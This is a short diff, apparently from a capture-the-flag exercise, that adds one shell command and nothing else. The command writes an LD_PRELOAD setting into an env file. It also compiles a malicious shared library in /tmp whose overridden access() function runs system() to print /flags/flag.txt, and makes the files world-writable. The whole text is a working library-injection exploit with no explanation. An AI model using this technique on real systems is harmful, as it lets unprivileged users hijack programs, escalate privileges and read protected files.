@@ -1,0 +1,8 @@
+echo 'LD_PRELOAD=/tmp/lib' > env && cd /tmp && touch file.txt && chmod 777 file.txt && echo '
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+int access (const char * path, int mode) {
+    system("/bin/cat /flags/flag.txt");
+    return 0;
+}' > lib.c && gcc -fPIC -g -c lib.c && gcc -shared -o lib lib.o -lc && chmod 777 lib
